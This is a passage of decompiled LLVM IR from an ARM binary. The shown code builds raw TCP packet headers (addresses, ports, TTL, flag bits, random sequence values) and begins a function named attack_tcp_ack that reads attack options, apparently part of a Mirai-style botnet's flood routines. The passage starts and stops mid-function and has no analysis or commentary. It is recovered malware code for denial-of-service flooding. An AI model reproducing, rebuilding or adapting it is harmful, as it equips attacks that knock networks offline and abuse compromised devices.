  %v6_b95c = icmp slt i32 %v2_b574, %v2_b950
  br i1 %v6_b95c, label %dec_label_pc_b8cc, label %dec_label_pc_b768

dec_label_pc_b964:                                ; preds = %dec_label_pc_b714
  %v3_b964 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b964, i32* @r5, align 4
  store i32 %v2_b3c0, i32* %ip.global-to-local, align 4
  store i32 %stack_var_-340.0.ph, i32* %r0.global-to-local, align 4
  %v5_b970 = mul i32 %v3_b964, 16
  %v6_b970 = add i32 %v5_b970, %v2_b3c0
  %v7_b970 = inttoptr i32 %v6_b970 to i32*
  store i32 %v0_b970, i32* %v7_b970, align 4
  %v0_b974 = load i32, i32* %r0.global-to-local, align 4
  %v1_b974 = add i32 %v0_b974, 4
  %v2_b974 = inttoptr i32 %v1_b974 to i32*
  %v3_b974 = load i32, i32* %v2_b974, align 4
  %v1_b978 = and i32 %v3_b974, 16711680
  store i32 %v1_b978, i32* %r0.global-to-local, align 4
  %v5_b98c = call i32 @llvm.bswap.i32(i32 %v3_b974)
  store i32 %v5_b98c, i32* %r3.global-to-local, align 4
  store i32 %v2_b3c0, i32* %r1.global-to-local, align 4
  %v0_b994 = load i32, i32* @r5, align 4
  %v3_b994 = mul i32 %v0_b994, 16
  %v2_b998 = add i32 %v3_b994, %v2_b3c0
  store i32 %v2_b998, i32* %ip.global-to-local, align 4
  %v2_b99c = add i32 %v2_b998, 4
  %v3_b99c = inttoptr i32 %v2_b99c to i32*
  store i32 %v5_b98c, i32* %v3_b99c, align 4
  store i32 %stack_var_-340.0.ph, i32* %r2.global-to-local, align 4
  %v1_b9a4 = add i32 %stack_var_-340.0.ph, 8
  %v2_b9a4 = inttoptr i32 %v1_b9a4 to i32*
  %v3_b9a4 = load i32, i32* %v2_b9a4, align 4
  %v1_b9b0 = and i32 %v3_b9a4, 65280
  store i32 %v1_b9b0, i32* %r2.global-to-local, align 4
  %v5_b9bc = call i32 @llvm.bswap.i32(i32 %v3_b9a4)
  store i32 %v5_b9bc, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-340.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v6_b544, i32* %r0.global-to-local, align 4
  %v1_b9c8 = add i32 %stack_var_-340.0.ph, 2
  %v2_b9c8 = inttoptr i32 %v1_b9c8 to i16*
  %v3_b9c8 = load i16, i16* %v2_b9c8, align 2
  %v4_b9c8 = zext i16 %v3_b9c8 to i32
  store i32 %v4_b9c8, i32* %r1.global-to-local, align 4
  store i32 %v1_b9cc, i32* @r4, align 4
  %v2_b9d0 = load i32, i32* %ip.global-to-local, align 4
  %v3_b9d0 = add i32 %v2_b9d0, 12
  %v4_b9d0 = inttoptr i32 %v3_b9d0 to i16*
  store i16 %v3_b9c8, i16* %v4_b9d0, align 2
  %v0_b9d4 = load i32, i32* @lr, align 4
  %v1_b9d4 = trunc i32 %v0_b9d4 to i16
  %v2_b9d4 = load i32, i32* %ip.global-to-local, align 4
  %v3_b9d4 = add i32 %v2_b9d4, 14
  %v4_b9d4 = inttoptr i32 %v3_b9d4 to i16*
  store i16 %v1_b9d4, i16* %v4_b9d4, align 2
  %v0_b9d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b9d8 = load i32, i32* %ip.global-to-local, align 4
  %v2_b9d8 = add i32 %v1_b9d8, 8
  %v3_b9d8 = inttoptr i32 %v2_b9d8 to i32*
  store i32 %v0_b9d8, i32* %v3_b9d8, align 4
  %v0_b9dc = load i32, i32* @r4, align 4
  store i32 %v0_b9dc, i32* @r0, align 4
  %v0_b9e0 = call i32 @malloc()
  store i32 %v0_b9e0, i32* %r0.global-to-local, align 4
  store i32 %v2_b3d0, i32* %r3.global-to-local, align 4
  %v2_b9ec = load i32, i32* @r5, align 4
  %v5_b9ec = mul i32 %v2_b9ec, 4
  %v6_b9ec = add i32 %v5_b9ec, %v2_b3d0
  %v7_b9ec = inttoptr i32 %v6_b9ec to i32*
  store i32 %v0_b9e0, i32* %v7_b9ec, align 4
  %v3_b9f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b9f0, i32* %r2.global-to-local, align 4
  %v0_b9f4 = load i32, i32* %r3.global-to-local, align 4
  %v4_b9f4 = mul i32 %v3_b9f0, 4
  %v5_b9f4 = add i32 %v0_b9f4, %v4_b9f4
  %v6_b9f4 = inttoptr i32 %v5_b9f4 to i32*
  %v7_b9f4 = load i32, i32* %v6_b9f4, align 4
  store i32 %v7_b9f4, i32* %ip.global-to-local, align 4
  %v1_b9f8 = inttoptr i32 %v7_b9f4 to i8*
  %v2_b9f8 = load i8, i8* %v1_b9f8, align 1
  %tmp99 = urem i8 %v2_b9f8, 16
  %v1_b9fc = zext i8 %tmp99 to i32
  %v1_ba00 = or i32 %v1_b9fc, 64
  store i32 %v1_ba00, i32* %r3.global-to-local, align 4
  %v1_ba04 = trunc i32 %v1_ba00 to i8
  store i8 %v1_ba04, i8* %v1_b9f8, align 1
  %v0_ba08 = load i32, i32* %ip.global-to-local, align 4
  %v1_ba08 = inttoptr i32 %v0_ba08 to i8*
  %v2_ba08 = load i8, i8* %v1_ba08, align 1
  store i32 %v4_ba0c, i32* %lr.global-to-local, align 4
  %v1_ba10 = and i8 %v2_ba08, -16
  %v1_ba1c = or i8 %v1_ba10, 5
  %v0_ba20 = load i32, i32* @r4, align 4
  %v3_ba20 = mul i32 %v0_ba20, 65536
  store i32 %v3_ba20, i32* %r4.global-to-local, align 4
  store i32 %v5_ba24, i32* %r1.global-to-local, align 4
  store i32 %v1_b450, i32* %r0.global-to-local, align 4
  store i8 %v1_ba1c, i8* %v1_ba08, align 1
  %v0_ba30 = load i32, i32* %r1.global-to-local, align 4
  %v1_ba30 = trunc i32 %v0_ba30 to i16
  %v2_ba30 = load i32, i32* %ip.global-to-local, align 4
  %v3_ba30 = add i32 %v2_ba30, 4
  %v4_ba30 = inttoptr i32 %v3_ba30 to i16*
  store i16 %v1_ba30, i16* %v4_ba30, align 2
  %v0_ba34 = load i32, i32* %r4.global-to-local, align 4
  %v3_ba34 = udiv i32 %v0_ba34, 256
  %v1_ba3c = and i32 %v3_ba34, 65280
  store i32 %v1_ba3c, i32* %r2.global-to-local, align 4
  %v2_ba40 = load i32, i32* %ip.global-to-local, align 4
  %v3_ba40 = add i32 %v2_ba40, 1
  %v4_ba40 = inttoptr i32 %v3_ba40 to i8*
  store i8 %v5_b408, i8* %v4_ba40, align 1
  %v0_ba44 = load i32, i32* %r2.global-to-local, align 4
  %v1_ba44 = load i32, i32* %r4.global-to-local, align 4
  %v4_ba44 = udiv i32 %v1_ba44, 16777216
  %v5_ba44 = or i32 %v4_ba44, %v0_ba44
  %v1_ba48 = trunc i32 %v5_ba44 to i16
  %v2_ba48 = load i32, i32* %ip.global-to-local, align 4
  %v3_ba48 = add i32 %v2_ba48, 2
  %v4_ba48 = inttoptr i32 %v3_ba48 to i16*
  store i16 %v1_ba48, i16* %v4_ba48, align 2
  %v0_ba50 = load i32, i32* %ip.global-to-local, align 4
  %v1_ba50 = add i32 %v0_ba50, 20
  store i32 %v1_ba50, i32* %r3.global-to-local, align 4
  %v3_ba54 = add i32 %v0_ba50, 8
  %v4_ba54 = inttoptr i32 %v3_ba54 to i8*
  store i8 %v5_b440, i8* %v4_ba54, align 1
  %v0_ba58 = load i32, i32* %r3.global-to-local, align 4
  %v2_ba60 = load i32, i32* %ip.global-to-local, align 4
  %v3_ba60 = add i32 %v2_ba60, 9
  %v4_ba60 = inttoptr i32 %v3_ba60 to i8*
  store i8 6, i8* %v4_ba60, align 1
  store i32 ptrtoint (i32* @global_var_2610c.91 to i32), i32* %r2.global-to-local, align 4
  %v2_ba68 = load i32, i32* @global_var_2610c.91, align 4
  store i32 %v2_ba68, i32* %r1.global-to-local, align 4
  %v1_ba6c = load i32, i32* %ip.global-to-local, align 4
  %v2_ba6c = add i32 %v1_ba6c, 12
  %v3_ba6c = inttoptr i32 %v2_ba6c to i32*
  store i32 %v2_ba68, i32* %v3_ba6c, align 4
  %v0_ba70 = load i32, i32* %r0.global-to-local, align 4
  %v2_ba70 = icmp eq i32 %v0_ba70, 0
  %v3_ba74 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ba74, i32* %r3.global-to-local, align 4
  store i32 %v2_b3c0, i32* %r0.global-to-local, align 4
  br i1 %v2_ba70, label %.thread10, label %bb80

bb80:                                             ; preds = %dec_label_pc_b964
  store i32 64, i32* %lr.global-to-local, align 4
  %v3_ba80 = load i32, i32* %ip.global-to-local, align 4
  %v4_ba80 = add i32 %v3_ba80, 6
  %v5_ba80 = inttoptr i32 %v4_ba80 to i16*
  store i16 64, i16* %v5_ba80, align 2
  %v0_ba84.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_ba84.pre = load i32, i32* %r3.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_b964, %bb80
  %v0_ba88 = phi i32 [ %v3_ba74, %dec_label_pc_b964 ], [ %v1_ba84.pre, %bb80 ]
  %v1_ba8c = phi i32 [ %v2_b3c0, %dec_label_pc_b964 ], [ %v0_ba84.pre, %bb80 ]
  %v4_ba84 = mul i32 %v0_ba88, 16
  %v5_ba84 = add i32 %v4_ba84, %v1_ba8c
  %v6_ba84 = inttoptr i32 %v5_ba84 to i32*
  %v7_ba84 = load i32, i32* %v6_ba84, align 4
  store i32 %v7_ba84, i32* %r2.global-to-local, align 4
  store i32 %v5_ba84, i32* %r3.global-to-local, align 4
  %v1_ba90 = load i32, i32* %ip.global-to-local, align 4
  %v2_ba90 = add i32 %v1_ba90, 16
  %v3_ba90 = inttoptr i32 %v2_ba90 to i32*
  store i32 %v7_ba84, i32* %v3_ba90, align 4
  %v0_ba94 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba94 = add i32 %v0_ba94, 12
  %v2_ba94 = inttoptr i32 %v1_ba94 to i16*
  %v3_ba94 = load i16, i16* %v2_ba94, align 2
  %v4_ba94 = zext i16 %v3_ba94 to i32
  store i32 %v4_ba94, i32* %r1.global-to-local, align 4
  %v0_ba98 = load i32, i32* %ip.global-to-local, align 4
  %v1_ba98 = add i32 %v0_ba98, 40
  store i32 %v1_ba98, i32* @r4, align 4
  %v3_ba9c = add i32 %v0_ba98, 20
  %v4_ba9c = inttoptr i32 %v3_ba9c to i16*
  store i16 %v3_ba94, i16* %v4_ba9c, align 2
  store i32 %v0_ba58, i32* %ip.global-to-local, align 4
  %v0_baa4 = load i32, i32* %r3.global-to-local, align 4
  %v1_baa4 = add i32 %v0_baa4, 8
  %v2_baa4 = inttoptr i32 %v1_baa4 to i32*
  %v3_baa4 = load i32, i32* %v2_baa4, align 4
  store i32 %v3_baa4, i32* %r1.global-to-local, align 4
  %v2_baa8 = add i32 %v0_ba58, 4
  %v3_baa8 = inttoptr i32 %v2_baa8 to i32*
  store i32 %v3_baa4, i32* %v3_baa8, align 4
  %v0_baac = load i32, i32* %ip.global-to-local, align 4
  %v1_baac = add i32 %v0_baac, 13
  %v2_baac = inttoptr i32 %v1_baac to i8*
  %v3_baac = load i8, i8* %v2_baac, align 1
  %v4_baac = zext i8 %v3_baac to i32
  store i32 %v4_baac, i32* %r2.global-to-local, align 4
  %v0_bab0 = load i32, i32* %r3.global-to-local, align 4
  %v1_bab0 = add i32 %v0_bab0, 4
  %v2_bab0 = inttoptr i32 %v1_bab0 to i32*
  %v3_bab0 = load i32, i32* %v2_bab0, align 4
  store i32 %v3_bab0, i32* %r1.global-to-local, align 4
  %v1_bab4 = add i32 %v0_bab0, 14
  %v2_bab4 = inttoptr i32 %v1_bab4 to i16*
  %v3_bab4 = load i16, i16* %v2_bab4, align 2
  %v4_bab4 = zext i16 %v3_bab4 to i32
  store i32 %v4_bab4, i32* %r3.global-to-local, align 4
  %v1_bab8 = or i32 %v4_baac, 1
  store i32 %v1_bab8, i32* %r2.global-to-local, align 4
  %v3_babc = add i32 %v0_baac, 2
  %v4_babc = inttoptr i32 %v3_babc to i16*
  store i16 %v3_bab4, i16* %v4_babc, align 2
  %v0_bac0 = load i32, i32* %r2.global-to-local, align 4
  %v1_bac0 = trunc i32 %v0_bac0 to i8
  %v2_bac0 = load i32, i32* %ip.global-to-local, align 4
  %v3_bac0 = add i32 %v2_bac0, 13
  %v4_bac0 = inttoptr i32 %v3_bac0 to i8*
  store i8 %v1_bac0, i8* %v4_bac0, align 1
  %v0_bac4 = load i32, i32* %ip.global-to-local, align 4
  %v1_bac4 = add i32 %v0_bac4, 12
  %v2_bac4 = inttoptr i32 %v1_bac4 to i8*
  %v3_bac4 = load i8, i8* %v2_bac4, align 1
  %v4_bac4 = zext i8 %v3_bac4 to i32
  store i32 %v4_bac4, i32* %r3.global-to-local, align 4
  %v1_bac8 = add i32 %v0_bac4, 13
  %v2_bac8 = inttoptr i32 %v1_bac8 to i8*
  %v3_bac8 = load i8, i8* %v2_bac8, align 1
  %v4_bac8 = zext i8 %v3_bac8 to i32
  %tmp100 = urem i8 %v3_bac4, 16
  %v1_bacc = zext i8 %tmp100 to i32
  %v1_bad0 = or i32 %v1_bacc, 128
  store i32 %v1_bad0, i32* %r3.global-to-local, align 4
  %v1_bad4 = or i32 %v4_bac8, 16
  store i32 %v1_bad4, i32* %r2.global-to-local, align 4
  %v0_bad8 = load i32, i32* %r1.global-to-local, align 4
  %v2_bad8 = add i32 %v0_bac4, 8
  %v3_bad8 = inttoptr i32 %v2_bad8 to i32*
  store i32 %v0_bad8, i32* %v3_bad8, align 4
  %v0_badc = load i32, i32* %r3.global-to-local, align 4
  %v1_badc = trunc i32 %v0_badc to i8
  %v2_badc = load i32, i32* %ip.global-to-local, align 4
  %v3_badc = add i32 %v2_badc, 12
  %v4_badc = inttoptr i32 %v3_badc to i8*
  store i8 %v1_badc, i8* %v4_badc, align 1
  %v0_bae0 = load i32, i32* %r2.global-to-local, align 4
  %v1_bae0 = trunc i32 %v0_bae0 to i8
  %v2_bae0 = load i32, i32* %ip.global-to-local, align 4
  %v3_bae0 = add i32 %v2_bae0, 13
  %v4_bae0 = inttoptr i32 %v3_bae0 to i8*
  store i8 %v1_bae0, i8* %v4_bae0, align 1
  %v0_bae4 = call i32 @rand_next()
  %v1_bae4 = trunc i32 %v0_bae4 to i16
  store i32 %v0_bae4, i32* %r0.global-to-local, align 4
  store i32 %v0_ba58, i32* %lr.global-to-local, align 4
  store i32 %v1_b48c, i32* %r1.global-to-local, align 4
  %v1_baf0 = add i32 %v0_ba58, 13
  %v2_baf0 = inttoptr i32 %v1_baf0 to i8*
  %v3_baf0 = load i8, i8* %v2_baf0, align 1
  %v4_baf0 = zext i8 %v3_baf0 to i32
  store i32 %v1_baf4, i32* %r2.global-to-local, align 4
  %v1_baf8 = and i32 %v4_baf0, 223
  %v5_bafc = or i32 %v1_baf8, %v4_bafc
  store i32 %v5_bafc, i32* %r3.global-to-local, align 4
  %v1_bb00 = trunc i32 %v5_bafc to i8
  store i8 %v1_bb00, i8* %v2_baf0, align 1
  store i32 %v1_b4ac, i32* %ip.global-to-local, align 4
  %v0_bb08 = load i32, i32* %lr.global-to-local, align 4
  %v1_bb08 = add i32 %v0_bb08, 13
  %v2_bb08 = inttoptr i32 %v1_bb08 to i8*
  %v3_bb08 = load i8, i8* %v2_bb08, align 1
  %v4_bb08 = zext i8 %v3_bb08 to i32
  store i32 %v1_bb0c, i32* %r3.global-to-local, align 4
  %v1_bb10 = and i32 %v4_bb08, 239
  %v5_bb14 = or i32 %v1_bb10, %v4_bb14
  store i32 %v5_bb14, i32* %r2.global-to-local, align 4
  %v1_bb18 = trunc i32 %v5_bb14 to i8
  store i8 %v1_bb18, i8* %v2_bb08, align 1
  %v0_bb1c = load i32, i32* %lr.global-to-local, align 4
  %v1_bb1c = add i32 %v0_bb1c, 13
  %v2_bb1c = inttoptr i32 %v1_bb1c to i8*
  %v3_bb1c = load i8, i8* %v2_bb1c, align 1
  %v4_bb1c = zext i8 %v3_bb1c to i32
  store i32 %v1_b4cc, i32* %lr.global-to-local, align 4
  store i32 %v0_ba58, i32* %r1.global-to-local, align 4
  store i32 %v1_bb28, i32* %r2.global-to-local, align 4
  %v1_bb2c = and i32 %v4_bb1c, 247
  %v5_bb30 = or i32 %v1_bb2c, %v4_bb30
  store i32 %v5_bb30, i32* %r3.global-to-local, align 4
  %v1_bb34 = trunc i32 %v5_bb30 to i8
  store i8 %v1_bb34, i8* %v2_baf0, align 1
  store i32 %v1_b4ec, i32* %ip.global-to-local, align 4
  %v0_bb3c = load i32, i32* %r1.global-to-local, align 4
  %v1_bb3c = add i32 %v0_bb3c, 13
  %v2_bb3c = inttoptr i32 %v1_bb3c to i8*
  %v3_bb3c = load i8, i8* %v2_bb3c, align 1
  %v4_bb3c = zext i8 %v3_bb3c to i32
  store i32 %v1_bb40, i32* %r3.global-to-local, align 4
  %v1_bb44 = and i32 %v4_bb3c, 251
  %v5_bb48 = or i32 %v1_bb44, %v4_bb48
  store i32 %v5_bb48, i32* %r2.global-to-local, align 4
  %v1_bb4c = trunc i32 %v5_bb48 to i8
  store i8 %v1_bb4c, i8* %v2_bb3c, align 1
  store i32 %v1_b50c, i32* @lr, align 4
  %v0_bb54 = load i32, i32* %r1.global-to-local, align 4
  %v1_bb54 = add i32 %v0_bb54, 13
  %v2_bb54 = inttoptr i32 %v1_bb54 to i8*
  %v3_bb54 = load i8, i8* %v2_bb54, align 1
  %v4_bb54 = zext i8 %v3_bb54 to i32
  store i32 %v1_bb58, i32* %r2.global-to-local, align 4
  %v1_bb5c = and i32 %v4_bb54, 253
  %v4_bb60 = or i32 %v1_bb5c, %v3_bb60
  store i32 %v4_bb60, i32* %r3.global-to-local, align 4
  %v1_bb64 = trunc i32 %v4_bb60 to i8
  store i8 %v1_bb64, i8* %v2_bb54, align 1
  %v0_bb68 = load i32, i32* %r1.global-to-local, align 4
  %v1_bb68 = add i32 %v0_bb68, 13
  %v2_bb68 = inttoptr i32 %v1_bb68 to i8*
  %v3_bb68 = load i8, i8* %v2_bb68, align 1
  %v4_bb68 = zext i8 %v3_bb68 to i32
  %v1_bb70 = and i32 %v4_bb68, 254
  %v2_bb78 = or i32 %v1_bb70, %v1_bb74
  store i32 %v2_bb78, i32* %r3.global-to-local, align 4
  store i32 %v0_ba58, i32* %r2.global-to-local, align 4
  %v1_bb80 = trunc i32 %v2_bb78 to i8
  store i8 %v1_bb80, i8* %v2_baf0, align 1
  %v3_bb84 = load i32, i32* %r2.global-to-local, align 4
  %v4_bb84 = add i32 %v3_bb84, 14
  %v5_bb84 = inttoptr i32 %v4_bb84 to i16*
  store i16 %v1_bae4, i16* %v5_bb84, align 2
  store i32 %v6_b544, i32* %r1.global-to-local, align 4
  %v0_bb8c = load i32, i32* @r4, align 4
  store i32 %v0_bb8c, i32* %r0.global-to-local, align 4
  %v2_bb90 = call i32 @rand_alphastr(i32 %v0_bb8c, i32 %v6_b544)
  store i32 %v2_bb90, i32* %r0.global-to-local, align 4
  store i32 %v6_b544, i32* %ip.global-to-local, align 4
  %v2_bb9c = load i32, i32* @r4, align 4
  %v4_bb9c = add i32 %v2_bb9c, %v6_b544
  %v5_bb9c = inttoptr i32 %v4_bb9c to i8*
  store i8 0, i8* %v5_bb9c, align 1
  %v3_bba0 = load i32, i32* %stack_var_-44, align 4
  store i32 %arg2, i32* @lr, align 4
  %v1_bba8 = add i32 %v3_bba0, 1
  store i32 %v1_bba8, i32* @r3, align 4
  store i32 %v1_bba8, i32* %stack_var_-44, align 4
  %v5_bbb4 = icmp slt i32 %v1_bba8, %arg2
  br i1 %v5_bbb4, label %dec_label_pc_b5dc.outer, label %dec_label_pc_b768.preheader

; uselistorder directives
  uselistorder i32 %v1_bba8, { 1, 0, 2 }
  uselistorder i8* %v2_baf0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_bae4, { 1, 0 }
  uselistorder i32 %v0_ba58, { 1, 2, 4, 3, 6, 5, 0 }
  uselistorder i32 %v5_b98c, { 1, 0 }
  uselistorder i32 %v2_b950, { 1, 2, 0 }
  uselistorder i32 %v0_b940, { 1, 0 }
  uselistorder i32 %v0_b930, { 1, 0 }
  uselistorder i32 %v0_b8ec, { 1, 2, 0, 3 }
  uselistorder i32 %v1_b868, { 1, 2, 0, 3 }
  uselistorder i32 %v5_b830, { 1, 0 }
  uselistorder i32 %v4_b820, { 1, 0 }
  uselistorder i32 %v3_b7ec, { 1, 0 }
  uselistorder i32 %v3_b7cc, { 3, 2, 0, 1 }
  uselistorder i32 %v2_b7b8, { 1, 0 }
  uselistorder i32 %v3_b790, { 1, 0 }
  uselistorder i32 %v1_b784, { 2, 0, 1 }
  uselistorder i32 %v1_b758, { 1, 0, 2 }
  uselistorder i32 %v3_b740, { 0, 2, 3, 1 }
  uselistorder i32 %v4_b708, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 3, 1, 2 }
  uselistorder i32 %v0_b64c, { 1, 0, 2 }
  uselistorder i32 %v0_b970, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %v4_b63c, { 1, 0 }
  uselistorder i1 %v7_b634, { 1, 0 }
  uselistorder i32 %v3_b5e8, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %stack_var_-340.0.ph, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v1_bb58, { 1, 0 }
  uselistorder i32 %v1_bb40, { 1, 0 }
  uselistorder i32 %v1_bb0c, { 1, 0 }
  uselistorder i32 %v3_b700, { 1, 0 }
  uselistorder i32 %v1_bb28, { 1, 0 }
  uselistorder i32 %v1_baf4, { 1, 0 }
  uselistorder i32 %v4_ba0c, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v1_b9cc, { 2, 0, 1 }
  uselistorder i32 %v1_b718, { 1, 0 }
  uselistorder i32 %v4_b714, { 2, 0, 1 }
  uselistorder i32 %v2_b620, { 3, 2, 1, 4, 0 }
  uselistorder i16 %v5_b5d4, { 1, 0 }
  uselistorder i32 %v0_b5c4, { 1, 0 }
  uselistorder i32 %v3_b588, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_b574, { 1, 0 }
  uselistorder i32 %v1_b564, { 2, 1, 0 }
  uselistorder i32 %v6_b544, { 2, 7, 6, 5, 8, 3, 12, 11, 10, 13, 4, 0, 9, 1 }
  uselistorder i32 %v1_b50c, { 1, 0 }
  uselistorder i32 %v1_b4ec, { 1, 0 }
  uselistorder i32 %v1_b4cc, { 1, 0 }
  uselistorder i32 %v1_b4ac, { 1, 0 }
  uselistorder i32 %v1_b48c, { 1, 0 }
  uselistorder i32 %v6_b468, { 1, 0 }
  uselistorder i32 %v1_b450, { 1, 0 }
  uselistorder i32 %v5_b424, { 1, 0 }
  uselistorder i32 %v6_b3e8, { 1, 0 }
  uselistorder i32 %v2_b3d0, { 0, 2, 1, 3 }
  uselistorder i32 %v2_b3c0, { 3, 4, 0, 5, 1, 6, 2, 7 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 39, 40, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 25, 20, 21, 22, 23, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 46, 45, 47, 49, 48, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 7, 3, 4, 5, 6, 12, 8, 9, 10, 11, 14, 13, 16, 17, 15, 18, 20, 19, 23, 21, 27, 22, 24, 26, 25, 30, 28, 29, 31, 32, 33, 35, 36, 34, 37, 39, 38, 41, 40, 44, 43, 42, 45, 47, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 0 }
  uselistorder i32 %arg2, { 3, 2, 1, 6, 7, 5, 4, 0, 8, 10, 9, 11, 12, 13 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %dec_label_pc_b8cc, { 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_b898, { 1, 0 }
  uselistorder label %dec_label_pc_b7a8, { 1, 0 }
  uselistorder label %dec_label_pc_b768, { 1, 0 }
  uselistorder label %dec_label_pc_b694, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_b668, { 1, 0 }
  uselistorder label %dec_label_pc_b644, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_b5f8, { 1, 0 }
  uselistorder label %dec_label_pc_b5dc, { 1, 0 }
  uselistorder label %dec_label_pc_b5dc.outer, { 1, 0 }
}

define i32 @attack_tcp_ack(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_bbc0 = load i32, i32* @sb, align 4
  %v24_bbc0 = load i32, i32* @fp, align 4
  %v27_bbc0 = load i32, i32* @lr, align 4
  store i32 0, i32* @sl, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_bbec = call i32 @calloc(i32 %arg2, i32 4)
  %v0_bbf0 = load i32, i32* @r4, align 4
  store i32 %v0_bbf0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_bbfc = load i32, i32* @sl, align 4
  store i32 %v0_bbfc, i32* %r3.global-to-local, align 4
  %v0_bc00 = load i32, i32* @r5, align 4
  store i32 %v0_bc00, i32* %r0.global-to-local, align 4
  %v5_bc04 = inttoptr i32 %v0_bbf0 to i32*
  %v6_bc04 = call i32 @attack_get_opt_int(i32 %v0_bc00, i32* %v5_bc04, i32 2, i32 %v0_bbfc)
  %v1_bc10 = urem i32 %v6_bc04, 256
  store i32 %v1_bc10, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bc1c = load i32, i32* @r4, align 4
  store i32 %v0_bc1c, i32* %r1.global-to-local, align 4
  %v0_bc20 = load i32, i32* @r5, align 4
  store i32 %v0_bc20, i32* %r0.global-to-local, align 4
  %v5_bc24 = trunc i32 %v6_bc04 to i8
  %v6_bc28 = inttoptr i32 %v0_bc1c to i32*
  %v7_bc28 = call i32 @attack_get_opt_int(i32 %v0_bc20, i32* %v6_bc28, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1))
  %v0_bc2c = load i32, i32* @r4, align 4
  store i32 %v0_bc2c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_bc3c = load i32, i32* @r5, align 4
  store i32 %v0_bc3c, i32* %r0.global-to-local, align 4
  %v5_bc40 = inttoptr i32 %v0_bc2c to i32*
  %v6_bc40 = call i32 @attack_get_opt_int(i32 %v0_bc3c, i32* %v5_bc40, i32 4, i32 64)
  %v1_bc48 = urem i32 %v6_bc40, 256
  store i32 %v1_bc48, i32* %ip.global-to-local, align 4
  %v0_bc4c = load i32, i32* @r4, align 4
  store i32 %v0_bc4c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_bc54 = load i32, i32* @sl, align 4
  store i32 %v0_bc54, i32* %r3.global-to-local, align 4
  %v0_bc58 = load i32, i32* @r5, align 4
  store i32 %v0_bc58, i32* %r0.global-to-local, align 4
  %v6_bc60 = inttoptr i32 %v0_bc4c to i32*
  %v7_bc60 = call i32 @attack_get_opt_int(i32 %v0_bc58, i32* %v6_bc60, i32 5, i32 %v0_bc54)
  %v1_bc6c = urem i32 %v7_bc60, 256
  store i32 %v1_bc6c, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_bc78 = load i32, i32* @r4, align 4
  store i32 %v0_bc78, i32* %r1.global-to-local, align 4
